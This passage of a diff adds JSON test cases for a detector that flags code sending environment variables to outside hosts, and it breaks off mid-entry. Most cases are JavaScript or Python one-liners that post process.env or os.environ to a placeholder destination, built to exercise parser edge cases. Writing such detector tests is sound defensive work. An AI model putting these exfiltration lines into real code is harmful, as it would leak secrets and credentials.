+ {
+  "expect": "high",
+  "label": "slash_object_literal",
+  "text": "const x = {} / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_object_literal_filled",
+  "text": "const x = {a: 1} / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_object_literal_nested",
+  "text": "const x = {a: {}} / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_object_literal_returned",
+  "text": "function f() { return {} / fetch(\"https://example.invalid/x\", {body: process.env}) / right }"
+ },
+ {
+  "expect": "high",
+  "label": "slash_postfix_decrement",
+  "text": "left-- / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_postfix_increment",
+  "text": "left++ / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_postfix_index",
+  "text": "a[0]-- / fetch(\"https://example.invalid/x\", {body: process.env}) / c"
+ },
+ {
+  "expect": "high",
+  "label": "slash_postfix_member",
+  "text": "a.b++ / fetch(\"https://example.invalid/x\", {body: process.env}) / c"
+ },
+ {
+  "expect": "high",
+  "label": "slash_prefix_increment_then_name",
+  "text": "++left / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_regex_after_increment_on_next_line",
+  "text": "a\n++/'/.lastIndex; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_regex_after_prefix_increment",
+  "text": "++/'/.lastIndex; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_regex_after_unfinished_class_literal",
+  "text": "x = [/[a, /'/.source]; fetch(dest, {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_arrow",
+  "text": "f = () => /'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_block_close",
+  "text": "{ a }\n/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_class_close",
+  "text": "class A {}\n/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_colon_in_object",
+  "text": "x = {a: /\"/}; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_comma",
+  "text": "f(a, /\"/.test(s)); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_not",
+  "text": "x = !/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_open_paren",
+  "text": "f(/\"/.test(s)); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_return",
+  "text": "function f() { return /\"/.test(s) }; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_semicolon",
+  "text": "a;\n/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_spread",
+  "text": "x = [.../'/.source]; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_try_close",
+  "text": "try {} catch (e) {}\n/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_typeof",
+  "text": "x = typeof /'/; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_unary_minus",
+  "text": "x = -/'/.source; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_after_while_condition",
+  "text": "while (a) /'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_rx_at_start_of_text",
+  "text": "/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "slash_selection_after_object_stays_clear",
+  "text": "x = {} / fetch(u, {body: process.env[\"A\"]}) / b"
+ },
+ {
+  "expect": "clear",
+  "label": "slash_selection_after_postfix_stays_clear",
+  "text": "a++ / fetch(u, {body: process.env.HOME}) / b"
+ },
+ {
+  "expect": "clear",
+  "label": "slash_tight_line_start_division_is_a_limit",
+  "limit": true,
+  "text": "const x = left\n/fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "spread_after_local",
+  "text": "axios({url: \"http://localhost\", ...remote, data: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "spread_before_local",
+  "text": "axios({...remote, data: process.env, url: \"http://localhost\"})"
+ },
+ {
+  "expect": "high",
+  "label": "template_call_substitution",
+  "text": "const s = `${axios.post(destination, process.env)}`;"
+ },
+ {
+  "expect": "high",
+  "label": "template_env_body",
+  "text": "fetch(destination, {body: `${JSON.stringify(process.env)}`})"
+ },
+ {
+  "expect": "high",
+  "label": "template_expression_call",
+  "text": "const x = `prefix ${fetch(destination, {body: JSON.stringify(process.env)})} suffix`;"
+ },
+ {
+  "expect": "high",
+  "label": "template_local_substitution",
+  "text": "fetch(`http://localhost/${path}`, {body: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "template_nested_expression",
+  "text": "const x = `prefix ${`nested ${axios.post(destination, process.env)}`} suffix`;"
+ },
+ {
+  "expect": "clear",
+  "label": "template_plain",
+  "text": "const s = `axios.post(destination, process.env)`;"
+ },
+ {
+  "expect": "clear",
+  "label": "template_plain_literal",
+  "text": "const x = `axios.post(destination, process.env)`;"
+ },
+ {
+  "expect": "clear",
+  "label": "whole_nested_namespace",
+  "text": "fetch(destination, {body: other.nested.process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "whole_nested_namespace_2",
+  "text": "requests.post(destination, json=other.os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_return",
+  "text": "obj.return++ / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_await",
+  "text": "obj.await-- / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_of",
+  "text": "obj.of++ / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_in",
+  "text": "obj.in++ / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_delete",
+  "text": "obj.delete++ / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_typeof",
+  "text": "obj.typeof-- / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "member_postfix_yield",
+  "text": "obj.yield++ / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "clear",
+  "label": "keyword_prefix_sign_return",
+  "text": "return ++/fetch(destination, {body: process.env})/.lastIndex"
+ },
+ {
+  "expect": "clear",
+  "label": "keyword_prefix_sign_typeof",
+  "text": "typeof ++/fetch(destination, {body: process.env})/.lastIndex"
+ },
+ {
+  "expect": "clear",
+  "label": "keyword_prefix_sign_void",
+  "text": "void ++/fetch(destination, {body: process.env})/.lastIndex"
+ },
+ {
+  "expect": "clear",
+  "label": "keyword_prefix_sign_delete",
+  "text": "delete ++/fetch(destination, {body: process.env})/.lastIndex"
+ },
+ {
+  "expect": "high",
+  "label": "function_expression_division",
+  "text": "const result = function() {} / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "class_expression_division",
+  "text": "const result = class {} / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "async_function_expression_division",
+  "text": "const result = async function() {} / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "function_expression_argument_division",
+  "text": "run(function() {} / fetch(destination, {body: process.env}) / 3);"
+ },
+ {
+  "expect": "clear",
+  "label": "function_declaration_then_literal",
+  "text": "function f() {} /fetch(destination, {body: process.env})/.test(x)"
+ },
+ {
+  "expect": "clear",
+  "label": "class_declaration_then_literal",
+  "text": "class K {} /fetch(destination, {body: process.env})/.test(x)"
+ },
+ {
+  "expect": "high",
+  "label": "function_expression_body_label_block",
+  "text": "const g = function() { switch (a) { case 1: { b() } } } / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "clear",
+  "label": "keyword_then_line_comment",
+  "text": "return // fetch(destination, {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "keyword_then_comment_star",
+  "text": "return //* \nfetch(destination, {body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "keyword_then_line_comment_after_value_is_a_comment",
+  "text": "return 1 // fetch(destination, {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_tuple",
+  "text": "p = patch(\"requests.post\")\np, q = ordinary, other\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_tuple_second",
+  "text": "p = patch(\"requests.post\")\nq, p = other, ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_tuple_star",
+  "text": "p = patch(\"requests.post\")\nq, *p = other, ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_list_target",
+  "text": "p = patch(\"requests.post\")\n[p, q] = ordinary, other\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_parenthesized_tuple",
+  "text": "p = patch(\"requests.post\")\n(p, q) = ordinary, other\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_annotated",
+  "text": "p = patch(\"requests.post\")\np: object = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_annotated_generic",
+  "text": "p = patch(\"requests.post\")\np: Optional[object] = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_walrus",
+  "text": "p = patch(\"requests.post\")\n(p := ordinary)\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_chained",
+  "text": "p = patch(\"requests.post\")\nq = p = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_chained_first",
+  "text": "p = patch(\"requests.post\")\np = q = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "rebind_chained_three",
+  "text": "p = patch(\"requests.post\")\nq = r = p = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_other_tuple_keeps_patch",
+  "text": "p = patch(\"requests.post\")\nq, r = ordinary, other\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_other_chain_keeps_patch",
+  "text": "p = patch(\"requests.post\")\nq = r = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_other_annotated_keeps_patch",
+  "text": "p = patch(\"requests.post\")\nq: object = ordinary\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_keyword_argument_keeps_patch",
+  "text": "p = patch(\"requests.post\")\nconfigure(p, q=1)\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_subscript_target_keeps_patch",
+  "text": "p = patch(\"requests.post\")\np[0] = 1\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_attribute_target_keeps_patch",
+  "text": "p = patch(\"requests.post\")\np.attr = 1\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_comparison_keeps_patch",
+  "text": "p = patch(\"requests.post\")\nsame = p == q\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_augmented_keeps_patch",
+  "text": "p = patch(\"requests.post\")\ncount += 1\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_default_parameter_keeps_patch",
+  "text": "p = patch(\"requests.post\")\ndef make(a, p=1): pass\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "factory_result_rebind",
+  "text": "p = patch(\"requests.post\").unrelated()\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "factory_result_operator",
+  "text": "p = patch(\"requests.post\") or other\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "factory_result_semicolon",
+  "text": "p = patch(\"requests.post\"); p.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "factory_result_comment",
+  "text": "p = patch(\"requests.post\")  # the double\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "factory_result_at_end",
+  "text": "p = patch(\"requests.post\")"
+ },
+ {
+  "expect": "high",
+  "label": "decorator_wrapped_patch",
+  "text": "def identity(value):\n    return lambda f: f\n@identity(patch(\"requests.post\"))\ndef sample():\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "decorator_patch_then_method",
+  "text": "@patch(\"requests.post\").unrelated()\ndef sample():\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "decorator_dotted_patch",
+  "text": "@mock.patch(\"requests.post\")\ndef sample():\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "decorator_patch",
+  "text": "@patch(\"requests.post\")\ndef sample():\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "with_two_layers",
+  "text": "with ((patch(\"requests.post\"))):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "with_three_layers",
+  "text": "with (((patch(\"requests.post\")))):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "with_layers_second_manager",
+  "text": "with (other(), ((patch(\"requests.post\")))):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "with_wrapped_call_unentered",
+  "text": "with (wrap(patch(\"requests.post\"))):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "with_inner_tuple_unentered",
+  "text": "with ((other(), patch(\"requests.post\"))):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "with_layers_after_block",
+  "text": "with ((patch(\"requests.post\"))):\n    pass\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_config_data",
+  "text": "axios(destination, {data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_config_params",
+  "text": "axios(destination, {params: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_config_headers",
+  "text": "axios(destination, {headers: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_config_url",
+  "text": "axios(destination, {url: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_url_config_body_unused",
+  "text": "axios(destination, {body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_url_config_json_unused",
+  "text": "axios(destination, {json: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_url_config_context_unused",
+  "text": "axios(destination, {context: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_config_spread",
+  "text": "axios(destination, {...process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_config_local_url_wins",
+  "text": "axios(\"https://other.example\", {url: \"http://localhost/\", data: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_config_only_body_unused",
+  "text": "axios({url: destination, body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_get_config_unused",
+  "text": "axios.get(destination, {timeout: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "fetch_options_local_url_is_data",
+  "text": "fetch(destination, {url: \"http://localhost/\", body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "got_options_local_url_is_data",
+  "text": "got(destination, {url: \"http://localhost/\", json: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "fetch_literal_local_destination",
+  "text": "fetch(\"http://localhost/\", {body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "got_literal_local_destination",
+  "text": "got(\"http://localhost/\", {json: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "arrow_expression_division",
+  "text": "const f = a => function() {} / fetch(destination, {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "object_value_function_division",
+  "text": "const o = {k: function() {} / fetch(destination, {body: process.env}) / 3};"
+ },
+ {
+  "expect": "clear",
+  "label": "member_keyword_then_block_then_literal",
+  "text": "a.class\n{} /fetch(destination, {body: process.env})/.test(x)"
+ },
+ {
+  "expect": "clear",
+  "label": "member_function_then_block_then_literal",
+  "text": "a.function\n{} /fetch(destination, {body: process.env})/.test(x)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_subscript_inside_tuple_keeps_patch",
+  "text": "p = patch(\"requests.post\")\np[0], q = 1, 2\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_call_subscript_keeps_patch",
+  "text": "p = patch(\"requests.post\")\np(a)[b] = 3\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "rebind_augmented_product_is_a_limit",
+  "text": "p = patch(\"requests.post\")\np *= 2\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "decorator_or_expression_patch",
+  "text": "@other or patch(\"requests.post\")\ndef sample():\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "with_inner_tuple_first_unentered",
+  "text": "with ((patch(\"requests.post\"), other())):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "with_group_as_name_entered",
+  "text": "with (patch(\"requests.post\")) as m:\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "with_group_then_attribute_unentered",
+  "text": "with (patch(\"requests.post\")).thing:\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "with_group_then_second_manager",
+  "text": "with (patch(\"requests.post\")), other():\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "function_default_object_then_division",
+  "text": "x = function(a = {}) {} / 2, fetch(\"https://e.invalid\", {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "class_heritage_group_object_then_division",
+  "text": "x = class extends (a, {}) {} / 2, fetch(\"https://e.invalid\", {body: process.env}) / 3;"
+ },
+ {
+  "expect": "high",
+  "label": "function_destructured_param_then_division",
+  "text": "x = function([a, {b}]) {} / 2, fetch(\"https://e.invalid\", {body: process.env}) / 3;"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_local_url_argument_with_config",
+  "text": "axios(\"http://localhost/\", {data: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_local_url_argument_wins_over_config_url",
+  "text": "axios(\"http://localhost/\", {url: \"http://e.invalid\", data: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_request_local_url_argument",
+  "text": "axios.request(\"http://localhost/\", {data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_variable_first_argument_is_not_local",
+  "text": "axios(u, {data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default",
+  "text": "let ratio = function sample(a = function(){}) {} / fetch(destination, {body: JSON.stringify(process.env)}) / divisor;"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default_arrow_semicolon",
+  "text": "let ratio = function sample(a = () => { let x; }) {} / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default_two_deep",
+  "text": "let ratio = function sample(a = function(b = function(){}){}) {} / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default_class_heritage",
+  "text": "let ratio = class extends (function(){}) {} / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default_in_brackets",
+  "text": "let ratio = function sample(a = [function(){}], b = {k: function(){}}) {} / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default_async",
+  "text": "let ratio = async function sample(a = async function(){}) {} / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "high",
+  "label": "expression_nested_default_two_statements",
+  "text": "let ratio = function sample(a = () => { let x; let y; }) {} / fetch(destination, {body: process.env}) / scale;"
+ },
+ {
+  "expect": "clear",
+  "label": "expression_stale_property_then_blocks",
+  "text": "({a:1, function:2})\nfunction outer(){ if(a){ if(b){} /fetch(destination, {body: process.env})/.test(x) }}"
+ },
+ {
+  "expect": "clear",
+  "label": "expression_stale_keyword_after_semicolon_then_blocks",
+  "text": "x = function; function outer(){ if(a){ if(b){} /fetch(destination, {body: process.env})/.test(x) }}"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_decorator_in_1_groups",
+  "text": "@(patch('requests.post'))\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_binding_in_1_groups",
+  "text": "p = (patch('requests.post'))\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_start_in_1_groups",
+  "text": "(patch('requests.post')).start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_started_value_in_1_groups",
+  "text": "r = (patch('requests.post')).start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_decorator_in_2_groups",
+  "text": "@((patch('requests.post')))\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_binding_in_2_groups",
+  "text": "p = ((patch('requests.post')))\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_start_in_2_groups",
+  "text": "((patch('requests.post'))).start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_started_value_in_2_groups",
+  "text": "r = ((patch('requests.post'))).start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_group_then_method",
+  "text": "@(patch('requests.post')).other\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_group_then_operator",
+  "text": "@(patch('requests.post')) or other\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_group_as_argument",
+  "text": "@wrap((patch('requests.post')))\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_group_in_a_tuple",
+  "text": "@(patch('requests.post'), other)\ndef sample():\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_binding_group_then_method",
+  "text": "p = (patch('requests.post')).other\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_binding_group_then_operator",
+  "text": "p = (patch('requests.post')) or other\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_binding_group_as_argument",
+  "text": "p = wrap((patch('requests.post')))\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_binding_group_in_a_tuple",
+  "text": "p = (patch('requests.post'), other)\np.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_start_group_then_method",
+  "text": "(patch('requests.post')).other.start()\nrequests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_manager_in_17_groups",
+  "text": "with (((((((((((((((((patch('requests.post')))))))))))))))))):\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_manager_in_64_groups",
+  "text": "with ((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((patch('requests.post'))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))):\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_manager_in_200_groups",
+  "text": "with ((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((patch('requests.post'))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))):\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_manager_in_64_groups_beside_another",
+  "text": "with ((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((patch('requests.post'))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), open(path):\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_manager_in_64_groups_as_argument",
+  "text": "with ((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((wrap(patch('requests.post')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))):\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_manager_in_64_groups_in_an_inner_tuple_is_one_value",
+  "text": "with ((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((patch('requests.post'), other)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))):\n    requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_patcher_through_17_functions",
+  "text": "p = patch(\"requests.post\")\ndef f0():\n def f1():\n  def f2():\n   def f3():\n    def f4():\n     def f5():\n      def f6():\n       def f7():\n        def f8():\n         def f9():\n          def f10():\n           def f11():\n            def f12():\n             def f13():\n              def f14():\n               def f15():\n                def f16():\n                 p.start()\n                 requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_patcher_through_64_functions",
+  "text": "p = patch(\"requests.post\")\ndef f0():\n def f1():\n  def f2():\n   def f3():\n    def f4():\n     def f5():\n      def f6():\n       def f7():\n        def f8():\n         def f9():\n          def f10():\n           def f11():\n            def f12():\n             def f13():\n              def f14():\n               def f15():\n                def f16():\n                 def f17():\n                  def f18():\n                   def f19():\n                    def f20():\n                     def f21():\n                      def f22():\n                       def f23():\n                        def f24():\n                         def f25():\n                          def f26():\n                           def f27():\n                            def f28():\n                             def f29():\n                              def f30():\n                               def f31():\n                                def f32():\n                                 def f33():\n                                  def f34():\n                                   def f35():\n                                    def f36():\n                                     def f37():\n                                      def f38():\n                                       def f39():\n                                        def f40():\n                                         def f41():\n                                          def f42():\n                                           def f43():\n                                            def f44():\n                                             def f45():\n                                              def f46():\n                                               def f47():\n                                                def f48():\n                                                 def f49():\n                                                  def f50():\n                                                   def f51():\n                                                    def f52():\n                                                     def f53():\n                                                      def f54():\n                                                       def f55():\n                                                        def f56():\n                                                         def f57():\n                                                          def f58():\n                                                           def f59():\n                                                            def f60():\n                                                             def f61():\n                                                              def f62():\n                                                               def f63():\n                                                                p.start()\n                                                                requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_patcher_through_64_functions_nearest_binding_wins",
+  "text": "p = patch(\"requests.post\")\ndef f0():\n def f1():\n  def f2():\n   def f3():\n    p = other\n    def f4():\n     def f5():\n      def f6():\n       def f7():\n        def f8():\n         def f9():\n          def f10():\n           def f11():\n            def f12():\n             def f13():\n              def f14():\n               def f15():\n                def f16():\n                 def f17():\n                  def f18():\n                   def f19():\n                    def f20():\n                     def f21():\n                      def f22():\n                       def f23():\n                        def f24():\n                         def f25():\n                          def f26():\n                           def f27():\n                            def f28():\n                             def f29():\n                              def f30():\n                               def f31():\n                                def f32():\n                                 def f33():\n                                  def f34():\n                                   def f35():\n                                    def f36():\n                                     def f37():\n                                      def f38():\n                                       def f39():\n                                        def f40():\n                                         def f41():\n                                          def f42():\n                                           def f43():\n                                            def f44():\n                                             def f45():\n                                              def f46():\n                                               def f47():\n                                                def f48():\n                                                 def f49():\n                                                  def f50():\n                                                   def f51():\n                                                    def f52():\n                                                     def f53():\n                                                      def f54():\n                                                       def f55():\n                                                        def f56():\n                                                         def f57():\n                                                          def f58():\n                                                           def f59():\n                                                            def f60():\n                                                             def f61():\n                                                              def f62():\n                                                               def f63():\n                                                                p.start()\n                                                                requests.post(destination, json=dict(os.environ))\n"
+ },
+ {
+  "expect": "high",
